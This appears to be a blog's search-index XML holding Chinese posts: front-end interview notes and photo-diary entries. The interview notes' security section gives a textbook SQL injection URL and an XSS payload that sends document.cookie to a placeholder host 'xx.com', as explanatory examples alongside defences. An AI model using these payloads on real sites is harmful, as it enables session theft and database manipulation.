<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>11月笔试题&amp;面试</title>
    <url>/2017/11/11%E6%9C%88%E7%AC%94%E8%AF%95%E9%A2%98&amp;%E9%9D%A2%E8%AF%95.html</url>
    <content><![CDATA[<ul>
<li>笔试<ul>
<li>编程</li>
<li>问答</li>
</ul>
</li>
<li>面试<ul>
<li>cookie&amp;session</li>
<li>安全</li>
<li>页面加载与渲染</li>
<li>性能优化</li>
</ul>
</li>
</ul>
<a id="more"></a>
<h1 id="笔试"><a href="#笔试" class="headerlink" title="笔试"></a>笔试</h1><h2 id="编程题"><a href="#编程题" class="headerlink" title="编程题"></a>编程题</h2><h3 id="1-给出一个字符串，求出其中出现次数最多的字符和其出现的次数；"><a href="#1-给出一个字符串，求出其中出现次数最多的字符和其出现的次数；" class="headerlink" title="1.给出一个字符串，求出其中出现次数最多的字符和其出现的次数；"></a>1.给出一个字符串，求出其中出现次数最多的字符和其出现的次数；</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我的思路：</span><br><span class="line">- 首先获取没有重复的字符合集数组tmp;</span><br><span class="line">- 再获取与tmp索引对应的字符出现次数数组sum;</span><br><span class="line">- 找出sum中数字最大的索引max;</span><br><span class="line">- 会出现两种情况：sum中数字最大的只有一个；有多个；</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">"asdfgfggaa"</span>;</span><br><span class="line"><span class="keyword">let</span> arr=[],tmp=[],sum=[],max=<span class="number">0</span>;</span><br><span class="line">arr = str.split(<span class="string">""</span>);</span><br><span class="line">tmp.push(arr[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">// 获取字符串中只出现一次的字符的集合：数组tmp</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> j=<span class="number">0</span>;j&lt;arr.length;j++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(tmp.indexOf(arr[j]) === <span class="number">-1</span>)&#123;</span><br><span class="line">        tmp.push(arr[j]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取跟tmp数组相对应的其内部元素出现的次数的数组sum</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;tmp.length;i++ )&#123;</span><br><span class="line">    <span class="keyword">let</span> result = arr.filter(<span class="function"><span class="keyword">function</span> (<span class="params">item</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tmp[i]===item;</span><br><span class="line">    &#125;);</span><br><span class="line">    sum[i] = result.length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 得到出现次数最多的字符的索引max</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> j=<span class="number">0</span>;j&lt;sum.length;j++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (sum[max] &lt; sum[j])&#123;</span><br><span class="line">        max = j;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//两种情况：次数最多只有一个；次数最多有多个</span></span><br><span class="line"><span class="keyword">let</span> query = sum.filter(<span class="function"><span class="keyword">function</span> (<span class="params">item</span>) </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> sum[max] === item;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">if</span>(query.length&gt;<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'有多个次数最多的字符！'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'出现的次数：'</span>+sum[max]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'他们分别是：'</span>);</span><br><span class="line">    sum.map(<span class="function"><span class="keyword">function</span> (<span class="params">item,index</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(item === sum[max])&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(tmp[index]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'出现次数最多的字符：'</span>+tmp[max]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'出现的次数：'</span>+sum[max]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果：<img src="http://static.simmzl.cn/blog/171104/E9fdJ54BK1.png?imageslim" alt="mark"></p>
<p>分别求没有重复的数组和对应的出现次数还是太麻烦，用对象更简单！</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str=<span class="string">"asdfgfggaaa"</span>;</span><br><span class="line"><span class="keyword">let</span> json=&#123;&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;str.length;i++)&#123;</span><br><span class="line">    <span class="comment">//判断json中是否存在str.charAr(i)的值</span></span><br><span class="line">    <span class="keyword">if</span>(!json[str.charAt(i)])&#123;</span><br><span class="line">        <span class="comment">//不存在则将其存放在json中,赋值为1</span></span><br><span class="line">        json[str.charAt(i)]=<span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//存在则这个字符的值加1，即次数加1</span></span><br><span class="line">        json[str.charAt(i)]++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(json);</span><br><span class="line"><span class="comment">//char存储出现次数最多的字符，num为该字符出现的次数</span></span><br><span class="line"><span class="keyword">let</span> char=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">let</span> num=<span class="number">0</span>;</span><br><span class="line"><span class="comment">//遍历json,找到值最大的字符和值</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> json)&#123;</span><br><span class="line">    <span class="keyword">if</span>(json[key]&gt;num)&#123;</span><br><span class="line">        <span class="comment">//如果json[key]大于num,就将键（字符）存放在char中，值存放在num中</span></span><br><span class="line">        char=key;</span><br><span class="line">        num=json[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//再遍历一次json,输出所有键值等于最多次数num的键和值</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> json)&#123;</span><br><span class="line">    <span class="keyword">if</span> (json[key] === num )&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'出现次数是：'</span>+num);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'字符是：'</span>+key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果：<img src="http://static.simmzl.cn/blog/171104/IGh02GHHIk.png?imageslim" alt="mark"></p>
<h3 id="2-将一个url的参数解析出来并封装成json格式；"><a href="#2-将一个url的参数解析出来并封装成json格式；" class="headerlink" title="2.将一个url的参数解析出来并封装成json格式；"></a>2.将一个url的参数解析出来并封装成json格式；</h3><ul>
<li>获取“？”之后的部分</li>
<li>以“&amp;”分割各个参数</li>
<li>以“=”分割各个参数与值</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> url = <span class="string">"https://www.baidu.com?name=guale&amp;age=100&amp;pwd=233&amp;sex=male"</span>;</span><br><span class="line"><span class="comment">// 找到？的索引index</span></span><br><span class="line"><span class="keyword">let</span> index = url.indexOf(<span class="string">'?'</span>);</span><br><span class="line"><span class="comment">// 剪切？之后的参数部分</span></span><br><span class="line"><span class="keyword">let</span> str = url.slice(index+<span class="number">1</span>);</span><br><span class="line"><span class="comment">// 以&amp;分割得到参数和值组成的数组</span></span><br><span class="line"><span class="keyword">let</span> arr = str.split(<span class="string">'&amp;'</span>);</span><br><span class="line"><span class="keyword">let</span> json=&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历arr数组，将数组每个元素以=分割，参数名存为json键，参数值存为对应键的值</span></span><br><span class="line">arr.map( <span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">   <span class="keyword">let</span> tmp = item.split(<span class="string">'='</span>);</span><br><span class="line">   json[tmp[<span class="number">0</span>]] = tmp[<span class="number">1</span>];</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>结果：<img src="http://static.simmzl.cn/blog/171104/D89E1E0219.png?imageslim" alt="mark"></p>
<h2 id="一些小题"><a href="#一些小题" class="headerlink" title="一些小题"></a>一些小题</h2><h3 id="邮箱的正则"><a href="#邮箱的正则" class="headerlink" title="邮箱的正则"></a>邮箱的正则</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[a-zA-Z0<span class="number">-9</span>_-]+@[a-zA-Z0<span class="number">-9</span>_-]+(\.[a-zA-Z0<span class="number">-9</span>_-]+)+$/;</span><br></pre></td></tr></table></figure>
<h3 id="rgb-255-16-25-转成十六进制格式"><a href="#rgb-255-16-25-转成十六进制格式" class="headerlink" title="rgb(255,16,25)转成十六进制格式"></a>rgb(255,16,25)转成十六进制格式</h3><p>其实就是分别将255、16、25转成16进制（FF、10、19），再合并成#FF1019就可以了，当时不知道这关系。。。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#FF1019</span></span><br></pre></td></tr></table></figure>
<h3 id="font-16px-20px-Arial-所以行高和字体大小是多少？"><a href="#font-16px-20px-Arial-所以行高和字体大小是多少？" class="headerlink" title="font: 16px/20px Arial;所以行高和字体大小是多少？"></a>font: 16px/20px Arial;所以行高和字体大小是多少？</h3><p>font 简写属性在一个声明中设置所有字体属性，平时写都是分开写的。<br>可以按顺序设置如下属性：</p>
<ul>
<li>font-style // 字体风格normal、italic、oblique、inherit</li>
<li>font-variant //字体异体 normal、small-caps、inherit</li>
<li>font-weight // nor、inh、100-900、bold、bolder、lighter</li>
<li>font-size/line-height</li>
<li>font-family</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">font-size</span><span class="selector-pseudo">:16px</span>;</span><br><span class="line"><span class="selector-tag">line-height</span><span class="selector-pseudo">:20px</span>;</span><br></pre></td></tr></table></figure>
<h3 id="join-‘-’-结果是多少"><a href="#join-‘-’-结果是多少" class="headerlink" title="[,,,,].join(‘,’)结果是多少"></a>[,,,,].join(‘,’)结果是多少</h3><p>首先[0,1,2,3,]其实就是[0,1,2,3]，所以[,,,,].length=4，并不是5;</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,].join(<span class="string">','</span>) = <span class="string">"0,1,2,3"</span></span><br><span class="line">[,,,,].join(<span class="string">','</span>) = <span class="string">",,,"</span></span><br></pre></td></tr></table></figure>
<h3 id="浏览器内核有哪些"><a href="#浏览器内核有哪些" class="headerlink" title="浏览器内核有哪些"></a>浏览器内核有哪些</h3><p>safari和曾经的chrome是Webkit内核，IE是Trident内核（三叉戟），firefox是Gecko内核（壁虎），opera和google联合研发的Blink内核（Opera内核原为Presto）</p>
<h3 id="transform：scale（2-2-5）用matrix怎么写"><a href="#transform：scale（2-2-5）用matrix怎么写" class="headerlink" title="transform：scale（2,2.5）用matrix怎么写"></a>transform：scale（2,2.5）用matrix怎么写</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">transform</span>：<span class="selector-tag">matrix</span>(2 0 0 2<span class="selector-class">.5</span> 0 0);</span><br></pre></td></tr></table></figure>
<p>matrix(a,b,c,d,e,f)，其中a和d控制scale缩放，e和f控制translate平移</p>
<h1 id="面试"><a href="#面试" class="headerlink" title="面试"></a>面试</h1><h2 id="cookie和session的区别"><a href="#cookie和session的区别" class="headerlink" title="cookie和session的区别"></a>cookie和session的区别</h2><ul>
<li><p>cookie数据存放在客户的浏览器上，一般浏览器打开时会放在RAM中，关闭则放在硬盘中，session数据放在服务器上，可以放在文件、数据库、或内存中都可以。</p>
</li>
<li><p>cookie不是很安全，别人可以分析存放在本地的cookie并进行cookie欺骗。</p>
</li>
<li><p>session会在一定时间内保存在服务器上。当访问增多，会比较占用服务器的性能，考虑到减轻服务器性能方面，应当使用cookie。</p>
</li>
<li><p>单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。</p>
</li>
<li><p>session 的运行依赖 session id，而 session id 是存在 cookie 中的，也就是说，如果浏览器禁用了 cookie ，同时 session 也会失效（但是可以通过其它方式实现，比如在 url 中传递 session_id参数）</p>
</li>
<li><p>所以一般会将登陆信息等重要信息存放为session,其他信息可以放在cookie中</p>
</li>
</ul>
<p><strong>HTTP协议是无状态的协议</strong>，服务端需要记录用户的状态时就需要用到session。典型的场景比如购物车，当点击下单按钮时，由于HTTP协议无状态，所以并不知道是哪个用户操作的，因此服务端要为特定的用户创建了特定的Session，用于标识这个用户，这样才知道购物车里面有几本书。这个Session保存在服务端的，有一个唯一标识。<br>在<strong>服务端保存Session的方法</strong>很多，内存、数据库、文件都有。集群的时候也要考虑Session的转移，在大型的网站，一般会有专门的Session服务器集群，用来保存用户会话，这个时候 Session 信息都是放在内存中。<br>而<strong>session依赖与cookie</strong>，在服务器判断是哪个用户时，需要客户端cookie将本地的session id通过http请求发给服务器。<br>如果客户端的浏览器<strong>禁用了 Cookie</strong> 怎么办？一般这种情况下，会使用一种叫做URL重写的技术来进行会话跟踪，即每次HTTP交互，URL后面都会被附加上一个诸如 sid=xxxxx 这样的参数，服务端据此来识别用户。</p>
<h2 id="两个标签页怎么通信"><a href="#两个标签页怎么通信" class="headerlink" title="两个标签页怎么通信"></a>两个标签页怎么通信</h2><h3 id="利用localStroage"><a href="#利用localStroage" class="headerlink" title="利用localStroage"></a>利用localStroage</h3><p>localStorge在一个标签页里被添加、修改或删除时，都会触发一个Storage事件，通过在另一个标签页里监听storage事件，即可得到localStorge存储的值，实现不同标签页之间的通信。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//a页面</span></span><br><span class="line"><span class="comment">// 两种方法设置 localStorage</span></span><br><span class="line">localStorage[<span class="string">'name'</span>] =<span class="string">'demo'</span>;</span><br><span class="line">localStorage.setItem(<span class="string">'name'</span>,<span class="string">'demo'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//b页面</span></span><br><span class="line"><span class="comment">// 两种方法获取 localStorage</span></span><br><span class="line"><span class="built_in">console</span>.log(localStorage[<span class="string">'name'</span>]);</span><br><span class="line"><span class="built_in">console</span>.log(localStorage.getItem(<span class="string">'name'</span>));</span><br></pre></td></tr></table></figure>
<h3 id="利用cookie和setInterval"><a href="#利用cookie和setInterval" class="headerlink" title="利用cookie和setInterval"></a>利用cookie和setInterval</h3><p>将要传递的信息存储在cookie中，每隔一定时间读取cookie信息，即可随时获取要传递的信息。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//a页面</span></span><br><span class="line"><span class="built_in">document</span>.cookie=<span class="string">"name=demo"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//b页面</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getKey</span>(<span class="params">key</span>) </span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">JSON</span>.parse(<span class="string">"&#123;\""</span>+ <span class="built_in">document</span>.cookie.replace(<span class="regexp">/;\s+/gim</span>,<span class="string">"\",\""</span>).replace(<span class="regexp">/=/gim</span>, <span class="string">"\":\""</span>) +<span class="string">"\"&#125;"</span>)[key];  </span><br><span class="line">&#125;  </span><br><span class="line">setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(getKey(<span class="string">"name"</span>));  </span><br><span class="line">&#125;,<span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
<h2 id="对jsp的了解"><a href="#对jsp的了解" class="headerlink" title="对jsp的了解"></a>对jsp的了解</h2><p>JSP 与 PHP、ASP、ASP.NET 等语言类似，运行在服务端的语言。全称Java Server Pages，jsp文件是在服务器上执行，JSP页面由HTML代码和嵌入其中的Java代码所组成，就想php代码可以写进html中一样，jsp使用<code>&lt;% jsp代码 %&gt;</code>插入到html中</p>
<h2 id="对Promise的了解"><a href="#对Promise的了解" class="headerlink" title="对Promise的了解"></a>对Promise的了解</h2><p>Promise是异步编程的一种解决方案，在ES6推出之后成为了原生对象。面试时被问到promise一脸懵逼，为此特意整理了一篇博客<a href="http://blog.simmzl.cn/2017/11/Promise%E5%AF%B9%E8%B1%A1-%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.html">Promise对象-异步编程解决方案</a></p>
<h2 id="如何加快页面加载速度"><a href="#如何加快页面加载速度" class="headerlink" title="如何加快页面加载速度"></a>如何加快页面加载速度</h2><ul>
<li>使用CDN加速</li>
<li>雪碧图</li>
<li><strong>使用外部的JavaScript和CSS</strong>，当脚本或者样式是从外部引入的文件，浏览器就有可能缓存它们，从而在以后加载的时候能够直接使用缓存，而HTML文档的大小减小，从而提高加载速度。</li>
<li>将js、css件合并压缩精简；</li>
<li>压缩组件，Web客户端可以通过HTTP请求设置Accept-Encoding为gzip</li>
</ul>
<h2 id="如何加快页面渲染速度"><a href="#如何加快页面渲染速度" class="headerlink" title="如何加快页面渲染速度"></a>如何加快页面渲染速度</h2><ul>
<li>减少HTML DOM深度，因为DOM树的生成是从上到下，渲染完一个节点内的所有子节点才开始渲染下一个节点</li>
<li>避免使用table标签</li>
<li>将css放在head内，js放在body内最底部</li>
<li>避免使用css表达式</li>
<li>指定页面图片的尺寸，可以避免尺寸改变导致的页面结构效果的变化，所以对加快页面渲染速度有益。</li>
<li>页面头部标明文档编码，客户端浏览器只有在确定了页面编码后才能正确的渲染页面</li>
</ul>
<h3 id="像素渲染流水线"><a href="#像素渲染流水线" class="headerlink" title="像素渲染流水线"></a>像素渲染流水线</h3><ul>
<li>下载HTML文档</li>
<li>解析HTML文档，生成DOM</li>
<li>下载文档中引用的CSS、JS</li>
<li>解析CSS样式表，生成CSSOM</li>
<li>将JS代码交给JS引擎执行</li>
<li>合并DOM和CSSOM，生成Render Tree</li>
<li>根据Render Tree进行布局layout（为每个元素计算尺寸和位置信息）</li>
<li>绘制（Paint）每个层中的元素（绘制每个瓦片，瓦片这个词与GIS中的瓦片含义相同）</li>
<li>执行图层合并（Composite Layers）</li>
</ul>
<h2 id="前端安全"><a href="#前端安全" class="headerlink" title="前端安全"></a>前端安全</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>攻击者通过网页上搜索框提交含有SQL操作语句的信息给后端，后端如果没有做好过滤就执行该语句，攻击者自然可以随意操纵该站点的数据库。</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">//一般搜索通过get发送请求时url:</span><br><span class="line">book.com/book?id=100</span><br><span class="line">//说明这本书在数据库中的键值是100，后端收到url参数后就执行了数据库查询操作：</span><br><span class="line">select * from booktable where id='100'</span><br><span class="line">//如果我们把url更改或者搜索框加上or'1'='1</span><br><span class="line">book.com/book?id=100'or'1'='1</span><br><span class="line">//后端：</span><br><span class="line">select * from booktable where id='100'or'1'='1'</span><br></pre></td></tr></table></figure>
<h3 id="XSS（cross-site-scripting跨域脚本攻击）"><a href="#XSS（cross-site-scripting跨域脚本攻击）" class="headerlink" title="XSS（cross-site scripting跨域脚本攻击）"></a>XSS（cross-site scripting跨域脚本攻击）</h3><p>主要依靠站点服务端返回脚本，在客户端触发执行从而发起WEB攻击。<br>如发送垃圾邮件让别人点击：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">book.com/search?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">'http://xx.com/get?cookie='</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>服务器会返回并执行：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">'http://xx.com/get?cookie='</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样就可以将用户的浏览器中的该网站的<strong>cookie</strong>信息发给黑客。</p>
<h4 id="基于本地的XSS攻击"><a href="#基于本地的XSS攻击" class="headerlink" title="基于本地的XSS攻击"></a>基于本地的XSS攻击</h4><p>为用户提供免费的wifi，但是提供免费wifi的<strong>网关</strong>会往你访问的任何页面插入一段脚本，获取你的敏感数据，像这种直接存在于页面，无须经过服务器返回脚本处理就直接跨域发送用户信息的行为就是基于本地的XSS攻击。</p>
<h4 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h4><ul>
<li>文本输入时对js关键字做编码，让回给用户浏览器的js不可执行</li>
<li>字符串过滤</li>
</ul>
<h3 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h3><p>CSRF是通过<strong>伪装来自受信任用户的请求</strong>来利用受信任的网站；</p>
<ul>
<li>登录受信任网站a, 在本地生成cookie；</li>
<li>不登出a的情况下访问危险网站b；</li>
<li>b要求访问a；</li>
<li>用户访问a，并执行了恶意代码</li>
</ul>
<p>例如：Bob在使用银行web线上转账时，通过from表单Get方法提交申请，这时候url会有相应的变化；<br>假如Alice获取到这个链接，并修改为转账给自己账户，然后将这个url写入一个img标签的src中（src没有跨域的限制），并通过邮件发给Bob;<br>Bob收到邮件并通过浏览器点击图片，浏览器在通过src加载img时，就变成了Bob以自己的身份向银行发起转账给黑客的请求。</p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>笔试题</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>2019年3月</title>
    <url>/2019/04/2019%E5%B9%B43%E6%9C%88.html</url>
    <content><![CDATA[<p>到了三月，就又是一年，时间前所未有的快。</p>
<p>这个月搬了一次家，东西太多只能丢下一些。每搬一次，都会翻出快要忘掉的老物件，然后说再见。经历的事情越多，就越觉得过去的很多东西珍贵，想着得写点东西放点照片记录记录，就叫它月历好了。</p>
<a id="more"></a>
<p>这一年有大学很好的朋友结婚生孩子，有同事很不幸车祸，有远方的朋友离职考研考公上岸，也有朋友离开这个行业。这些对我的触动很大，不管你做了如何重大的决定，生活发生怎样翻天覆地的变化，别人的生活都照旧，这是再正常不过的事情。</p>
<p>时间太快了，决定都尽快实现吧。</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=522354339&auto=1&height=32"></iframe>

<img src="http://static.simmzl.cn/img/1903/0301.JPG" class="has-title" width="500" title="新到的 mac pro">
<img src="http://static.simmzl.cn/img/1903/0303.JPG">
<img src="http://static.simmzl.cn/img/1903/0313.PNG">
<img src="http://static.simmzl.cn/img/1903/0304.JPG" class="has-title" width="600" title="Beats">
<img src="http://static.simmzl.cn/img/1903/0312.JPG" width="400">
<img src="http://static.simmzl.cn/img/1903/0302.JPG" width="400">
<img src="http://static.simmzl.cn/img/1903/0305.JPG" width="400">
<img src="http://static.simmzl.cn/img/1903/0306.JPG" class="has-title" width="400" title="Mist">
<img src="http://static.simmzl.cn/img/1903/0307.JPG">
<img src="http://static.simmzl.cn/img/1903/0308.JPG">
<img src="http://static.simmzl.cn/img/1903/0309.JPG" width="400">
<img src="http://static.simmzl.cn/img/1903/0311.JPG" width="400">
<img src="http://static.simmzl.cn/img/1903/0310.JPG" class="has-title" width="600" title="Norway">
]]></content>
      <categories>
        <category>影像月历</category>
      </categories>
  </entry>
  <entry>
    <title>2019年4月</title>
    <url>/2019/05/2019%E5%B9%B44%E6%9C%88.html</url>
    <content><![CDATA[<p>well，4月过去了，30+的气温和断断续续的小雨提醒我这是一个南方的海滨城市。</p>
<a id="more"></a>
<p>月初迁了户口，办了一些港澳台护照之类的总该有的证，趁年轻还可以折腾一段时间吧。</p>
<p>下单了Airpods2，想买的总会买…</p>
<p>经历了所谓的金三银四，一些同事离开，也来了新的同事，互联网寒冬刮到了每个地方，野蛮生长变成了收敛聚焦。贸易战的博弈还在继续。</p>
<p>4月的某一天，李志的歌从所有网站、App中消失，逼哥隐晦傲慢不羁的作词大概是引起了某些人的不满，“恶毒的政治隐喻”，毕竟音乐和影像的力量过于强大，和谐才是最重要的…行吧，风波一过人们会很少谈起，但总会记得。</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=28226055&auto=1&height=66"></iframe>

<img src="http://static.simmzl.cn/img/1904/0401.jpeg" class="simmzl">
<img src="http://static.simmzl.cn/img/1904/0402.jpeg" class="has-title" width="400" title="NXT?">
<img src="http://static.simmzl.cn/img/1904/0403.jpeg" width="400">
<img src="http://static.simmzl.cn/img/1904/0404.jpeg" width="400">
<img src="http://static.simmzl.cn/img/1904/0405.jpeg" class="simmzl">
<img src="http://static.simmzl.cn/img/1904/0406.jpeg" class="simmzl" width="400">
<img src="http://static.simmzl.cn/img/1904/0407.jpeg" width="400">
<img src="http://static.simmzl.cn/img/1904/0408.jpeg">
<img src="http://static.simmzl.cn/img/1904/0409.jpeg" class="simmzl">
]]></content>
      <categories>
        <category>影像月历</category>
      </categories>
  </entry>
  <entry>
    <title>2019年5、6月，我离职了</title>
    <url>/2019/07/2019%E5%B9%B45%E3%80%816%E6%9C%88%EF%BC%8C%E6%88%91%E7%A6%BB%E8%81%8C%E4%BA%86.html</url>
    <content><![CDATA[<p>6月底最大的事，大概就是离职吧。</p>
<p>业务线经历了一个月内提升到南方区域，而后换了区首，战略重心调整，业务也被交接了出去，可以说是相当突然和魔幻了。</p>
<p>在众多诸如可以去其他业务线的选择中，大部分同事并不愿意去新的业务线重新开始，纷纷选择了拿补偿走人。综合所有选择和未来发展，在还没有太多顾虑和压力的时间点，拿补偿离职倒也是个不错的选择。</p>
<p>离开意味着新的机会与开始。</p>
<a id="more"></a>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=445844591&auto=1&height=66"></iframe>

<img src="http://static.simmzl.cn/img/050601.jpeg" class="simmzl">
<img src="http://static.simmzl.cn/img/050602.JPG" class="has-title" width="400" title="想买的总会买">
<img src="http://static.simmzl.cn/img/050603.JPG" width="400">
<img src="http://static.simmzl.cn/img/050604.JPG">
<img src="http://static.simmzl.cn/img/050606.JPG" class="has-title simmzl" width="400" title="随处可见的棕榈树或者椰子树，傻傻分不清">
<img src="http://static.simmzl.cn/img/050605.JPG" width="400">
<img src="http://static.simmzl.cn/img/050608.JPG" class="simmzl" width="400">
<img src="http://static.simmzl.cn/img/050607.JPG">
<img src="http://static.simmzl.cn/img/050609.JPG" class="simmzl">
<img src="http://static.simmzl.cn/img/050610.JPG" class="has-title simmzl" width="600" title="曾经上下班必经之路">
<img src="http://static.simmzl.cn/img/050611.JPG" class="has-title" width="600" title="NOMO">
<img src="http://static.simmzl.cn/img/050617.JPG" width="600">
<img src="http://static.simmzl.cn/img/050612.JPG" width="600">
<img src="http://static.simmzl.cn/img/050613.JPG" class="simmzl">
<img src="http://static.simmzl.cn/img/050614.JPG" class="simmzl" width="400">
<img src="http://static.simmzl.cn/img/050615.JPG" class="simmzl" width="400">
<img src="http://static.simmzl.cn/img/050616.JPG" class="simmzl">
]]></content>
      <categories>
        <category>影像月历</category>
      </categories>
  </entry>
  <entry>
    <title>2020年</title>
    <url>/2021/04/2020%E5%B9%B4.html</url>
    <content><![CDATA[<p>想说什么？</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1320101152&auto=1&height=66"></iframe>

<a id="more"></a>
<p>没有头绪。</p>
]]></content>
      <categories>
        <category>影像月历</category>
      </categories>
  </entry>
  <entry>
    <title>HTML DOM的nodeType属性</title>
    <url>/2017/10/HTML%20DOM%E7%9A%84nodeType%E5%B1%9E%E6%80%A7.html</url>
    <content><![CDATA[<h2 id="遇到这样一个问题："><a href="#遇到这样一个问题：" class="headerlink" title="遇到这样一个问题："></a>遇到这样一个问题：</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'container'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">'active'</span>&gt;</span>first<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在知道父级id之后，我想选取其firstChild即<code>&lt;p class=&#39;active&#39;&gt;first&lt;/p&gt;</code>,但是<code>container.firstChild.className</code> 却是undefined！</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> container = <span class="built_in">document</span>.getElementById(<span class="string">'container'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(container.firstChild.className);<span class="comment">//undefined</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
